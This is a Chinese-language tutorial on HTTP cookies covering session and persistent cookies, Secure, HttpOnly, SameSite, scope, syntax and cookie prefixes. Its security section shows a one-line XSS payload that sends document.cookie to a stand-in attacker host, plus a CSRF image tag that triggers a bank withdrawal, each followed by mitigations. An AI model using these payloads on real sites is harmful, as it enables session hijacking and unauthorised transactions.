## 基本概念

HTTP Cookie（也叫Web cookie或者浏览器Cookie）是服务器发送到用户浏览器并保存在浏览器上的一块数据，它会在浏览器下一次发起请求时被携带并发送到服务器上。比较经典的，可以它用来确定两次请求是否来自于同一个浏览器，从而能够确认和保持用户的登录状态。Cookie的使用使得基于无状态的HTTP协议上记录稳定的状态信息成为了可能。

#### Cookie主要用在以下三个方面:

* 会话状态管理（如用户登录状态、购物车）
* 个性化设置（如用户自定义设置）
* 浏览器行为跟踪（如跟踪分析用户行为）

Cookie可用于客户端数据的存储，在没有其它存储办法时，使用这种方式是可行的，但随着现在浏览器开始支持各种各样的存储方式而逐渐被废弃。由于服务器指定Cookie以后浏览器的每次请求都会携带Cookie数据，这会带来额外的性能负担（尤其是在移动环境下）。新的浏览器API已经允许开发者直接在本地存储数据，如可以使用Web storage API （本地存储和会话存储）和IndexedDB。

#### 会话期Cookie

会话期Cookie是最简单的Cookie：浏览器关闭之后它会被自动删除，也就是它仅在会话期间有效。会话期Cookie不需要指定过期时间（Expires）或者有效期（Max-Age）。需注意的是，有些浏览器提供了会话恢复的功能，这种情况下即便关闭了浏览器会话期Cookie也会被保存，就好像浏览器从来没有关闭一样。
#### 持久Cookie

和关闭浏览器便失效不同，持久Cookie可以指定一个特定的过期时间（Expires）或者有效期（Max-Age）。

```js
	Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
```

#### 安全和HttpOnly类型Cookie

只有在使用SLL和HTTPS协议向服务器发起请求时，才能确保Cookie被安全地发送到服务器。HttpOnly标志并没有给你提供额外的加密或者安全性上的能力，当整个机器暴露在不安全的环境时，切记绝不能通过HTTP Cookie存储、传输机密或者敏感信息。

HTTP-only类型的Cookie不能使用Javascript通过Document.cookie属性来访问，从而能够在一定程度上阻止跨域脚本攻击（XSS）。当你不需要在JavaScript代码中访问你的Cookie时，可以将该Cookie设置成HttpOnly类型。特别的，当你的Cookie仅仅是用于定义会话的情况下，最好给它设置一下HttpOnly标志。

```js
	Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
```

#### Cookie的作用域

Domain和Path指令定义了Cookie的作用域，即需要发送Cookie的URL集合。

Domain指令规定了需要发送Cookie的主机名。如果没有指定，默认为当前的文档地址上的主机名（但是不包含子域名）。如果指定了Domain，则一般包含子域名。

如果设置了Domain=mozilla.org，则Cookie包含在子域名中（如developer.mozilla.org）。

Path指令表明需要发送Cookie的URL路径。字符%x2F (即"/")用做文件夹分隔符，子文件夹也会被匹配到。

如设置Path=/docs，则下面这些地址都将匹配到:

* "/docs",
* "/docs/Web/",
* "/docs/Web/HTTP"

#### 同站Cookie

同站Cookie允许服务器指定在跨站请求时Cookie是否会被发送，从而可以阻止跨站请求伪造攻击（CSRF）。但目前同站Cookie还处于实验阶段，并没有被所有的浏览器所支持。

#### js通过Document.cookies访问Cookie

通过Document.cookie属性可以来创建新的Cookie，也能够通过该属性来访问未被指定HttpOnly标志的Cookie。

```js
	document.cookie = "yummy_cookie=choco"; 
	document.cookie = "tasty_cookie=strawberry"; 
	console.log(document.cookie); 
	// logs "yummy_cookie=choco; tasty_cookie=strawberry"

```

## 安全

<p class="warning">
	当整个机器暴露在不安全的环境时，切记绝不能通过HTTP Cookie存储、者传输机密或者敏感信息。
</p>

#### 会话劫持和XSS

在Web应用中，Cookie常常用来标记用户和会话授权。因此，如果窃取了Web应用的Cookie，可能导致授权用户的会话受到攻击。常用的窃取Cookie的方法有利用社会工程学进行攻击和利用应用程序的漏洞进行XSS攻击。

```js
	(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
```
HttpOnly类型的Cookie由于阻止了JavaScript对Cookie进行访问而能在一定程度上缓解此类攻击。

#### 跨站请求伪造（CSRF）

在这个情况下，有一张并不真实存在的图片（可能是在不安全聊天室或论坛），它实际上是向你的银行服务器发送了提现请求：

```html
	<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
```

当你打开含有了这张图片的HTML页面是，如果你已经登录了你的银行帐号并且还有效（而且没有其它验证步骤），你的银行里的钱可能会被自动转走。这里有一些方法可以阻止该类事情的发生：

* 对用户输入进行过滤来阻止XSS；
* 任何敏感的操作都应该被确认；
* 用于敏感信息的Cookie只能拥有较短的生命周期；
* 更多的方法可以看OWASP CSRF prevention cheat sheet。

## 追踪和隐私


#### 第三方Cookie

每个Cookie都有与之关联的域（Domain），如果Cookie的域和页面的域是一样的，那么我们称这个Cookie为第一方Cookie（first-party cookie），如果Cookie的域和页面的域不一样，则称之为第三方Cookie（third-party cookie.）。一个页面包含图片或存放在其他域上的资源（如广告横幅）时，第一方的Cookie也只会发送给设置它们的服务器。通过第三方组件发送的第三方Cookie主要用于广告和通过网络进行追踪。这方面可以看谷歌使用的Cookie类型（types of cookies used by Google）。大多数浏览器默认情况下都允许第三方Cookie，但是可以通过附加组件来阻止第三方Cookie（如，EFF的Privacy Badger）。

如果你没有公开你网站上第三方Cookie的使用情况，当它们被发觉时用户对你的信任程度可能受到影响。一个较清晰的声明（比如在隐私策略里面提及）能够减少或消除这些负面影响。在某些国家已经开始对Cookie制订了相应的法规，可以看维基百科上例子cookie statement。

#### 禁止追踪Do-Not-Track

虽然并没有法律或者技术手段强制要求使用DNT，但是通过DNT可以告诉Web程序禁止对用户的行为进行追踪或者跨站追踪。查看DNT以获取更多信息。

#### 欧盟Cookie指令

关于Cookie，欧盟已经在2009/136/EC指令中提了相关要求，该指令已于2011年5月25日生效。虽然指令并不属于法律，但它要求欧盟各成员国通过制定相关的法律来满足该指令所提的要求。当然，各国实际制定法律会有所差别。

欧盟指令的大意就是：在征得用户的同意之前，不允许通过计算机、手机或者其他设备存储、检索任何信息。自从那以后，很多网站都在网站横幅里增加了相关说明，告诉用户他们的Cookie将用于何处。

可以通过维基百科的相关内容获取最新的各国法律和较为准确的信息。
僵尸Cookie和删不掉的Cookie

Cookie的一个极端使用例子是僵尸Cookie（或称之为“删不掉的Cookie”），这类Cookie较难以删除，甚至删除之后会自动重建。它们一般是使使用Web storage API、Flash本地共享对象或者其他技术手段来达到目的的。相关内容可以看：

* <a href="https://github.com/samyk/evercookie">Evercookie by Samy Kamkar</a>
* <a href="https://en.wikipedia.org/wiki/Zombie_cookie">在维基百科上查看僵尸Cookie</a>

## 语法

```js
	Set-Cookie: <cookie-name>=<cookie-value> 
	Set-Cookie: <cookie-name>=<cookie-value>; Expires=<date>
	Set-Cookie: <cookie-name>=<cookie-value>; Max-Age=<non-zero-digit>
	Set-Cookie: <cookie-name>=<cookie-value>; Domain=<domain-value>
	Set-Cookie: <cookie-name>=<cookie-value>; Path=<path-value>
	Set-Cookie: <cookie-name>=<cookie-value>; Secure
	Set-Cookie: <cookie-name>=<cookie-value>; HttpOnly

	Set-Cookie: <cookie-name>=<cookie-value>; SameSite=Strict
	Set-Cookie: <cookie-name>=<cookie-value>; SameSite=Lax

	// Multiple directives are also possible, for example:
	Set-Cookie: <cookie-name>=<cookie-value>; Domain=<domain-value>; Secure; HttpOnly

```

## 指令

#### ``<cookie-name>=<cookie-value>``
一个 cookie 开始于一个名称/值对：

* ``<cookie-name>`` 可以是除了控制字符 (CTLs)、空格 (spaces) 或制表符 (tab)之外的任何 US-ASCII 字符。同时不能包含以下分隔字符： ( ) < > @ , ; : \ " /  [ ] ? = { }.

* ``<cookie-value>`` 是可选的，如果存在的话，那么需要包含在双引号里面。支持除了控制字符（CTLs）、空格（whitespace）、双引号（double quotes）、逗号（comma）、分号（semicolon）以及反斜线（backslash）之外的任意 US-ASCII 字符。关于编码：许多应用会对 cookie 值按照URL编码（URL encoding）规则进行编码，但是按照 RFC 规范，这不是必须的。不过满足规范中对于 <cookie-value> 所允许使用的字符的要求是有用的。

* __Secure- 前缀：以 __Secure- 为前缀的 cookie（其中连接符是前缀的一部分），必须与 secure 属性一同设置，同时必须应用于安全页面（即使用 HTTPS 访问的页面）。

* __Host- 前缀： 以 __Host- 为前缀的 cookie，必须与 secure 属性一同设置，必须应用于安全页面（即使用 HTTPS 访问的页面），必须不能设置 domain 属性 （也就不会发送给子域），同时 path 属性的值必须为“/”。

#### ``Expires=<date>`` 可选

cookie 的最长有效时间，形式为符合 HTTP-date 规范的时间戳。参考 Date 可以获取详细信息。如果没有设置这个属性，那么表示这是一个会话期 cookie 。一个会话结束于客户端被关闭时，这意味着会话期 cookie 在彼时会被移除。然而，很多Web浏览器支持会话恢复功能，这个功能可以使浏览器保留所有的tab标签，然后在重新打开浏览器的时候将其还原。与此同时，cookie 也会恢复，就跟从来没有关闭浏览器一样。

#### ``Max-Age=<non-zero-digit>`` 可选

在 cookie 失效之前需要经过的秒数。一位或多位非零（1-9）数字。一些老的浏览器（ie6、ie7 和 ie8）不支持这个属性。对于其他浏览器来说，假如二者 （指 Expires 和Max-Age） 均存在，那么 Max-Age 优先级更高。

#### ``Domain=<domain-value>`` 可选

指定 cookie 可以送达的主机名。假如没有指定，那么默认值为当前文档访问地址中的主机部分（但是不包含子域名）。与之前的规范不同的是，域名之前的点号会被忽略。假如指定了域名，那么相当于各个子域名也包含在内了。

#### ``Path=<path-value>`` 可选

指定一个 URL 路径，这个路径必须出现在要请求的资源的路径中才可以发送 Cookie 首部。字符  %x2F ("/") 可以解释为文件目录分隔符，此目录的下级目录也满足匹配的条件（例如，如果 path=/docs，那么 "/docs", "/docs/Web/" 或者 "/docs/Web/HTTP" 都满足匹配的条件）。

#### Secure 可选

一个带有安全属性的 cookie 只有在请求使用SSL和HTTPS协议的时候才会被发送到服务器。然而，保密或敏感信息永远不要在 HTTP cookie 中存储或传输，因为整个机制从本质上来说都是不安全的，比如前述协议并不意味着所有的信息都是经过加密的。

<p class="tip">
	注意：非安全站点（http:）已经不能再在 cookie 中设置 secure 指令了（在Chrome 52+ and Firefox 52+ 中新引入的限制）。
</p>

#### HttpOnly 可选

设置了 HttpOnly 属性的 cookie 不能使用 JavaScript 经由  Document.cookie 属性、XMLHttpRequest 和  Request APIs 进行访问，以防范跨站脚本攻击（XSS）。

#### SameSite=Strict
#### SameSite=Lax 可选 

允许服务器设定一则 cookie 不随着跨域请求一起发送，这样可以在一定程度上防范跨站请求伪造攻击（CSRF）。

##  示例

#### 会话期 cookie

会话期 cookies 将会在客户端关闭时被移除。 会话期 cookie 不设置 Expires 或 Max-Age 指令。注意浏览器通常支持会话恢复功能。

```js
	Set-Cookie: sessionid=38afes7a8; HttpOnly; Path=/
```
#### 持久化 cookie

```js
	Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
```

#### 非法域

属于特定域的 cookie，假如域名不能涵盖原始服务器的域名，那么应该被用户代理拒绝。下面这个 cookie 假如是被域名为 originalcompany.com 的服务器设置的，那么将会遭到用户代理的拒绝：

```js
	Set-Cookie: qwerty=219ffwef9w0f; Domain=somecompany.co.uk; Path=/; Expires=Wed, 30 Aug 2019 00:00:00 GMT
```

#### Cookie 前缀

名称中包含 __Secure- 或 __Host- 前缀的 cookie，只可以应用在使用了安全连接（HTTPS）的域中，需要同时设置 secure 指令。另外，假如 cookie 以 __Host- 为前缀，那么 path 属性的值必须为 "/" （表示整个站点），且不能含有 domain 属性。对于不支持 cookie 前缀的客户端，无法保证这些附加的条件成立，所以 cookie 总是被接受的。

```js
	// 当响应来自于一个安全域（HTTPS）的时候，二者都可以被客户端接受
	Set-Cookie: __Secure-ID=123; Secure; Domain=example.com
	Set-Cookie: __Host-ID=123; Secure; Path=/

	// 缺少 Secure 指令，会被拒绝
	Set-Cookie: __Secure-id=1

	// 缺少 Path=/ 指令，会被拒绝
	Set-Cookie: __Host-id=1; Secure

	// 由于设置了 domain 属性，会被拒绝
	Set-Cookie: __Host-id=1; Secure; Path=/; domain=example.com
```






















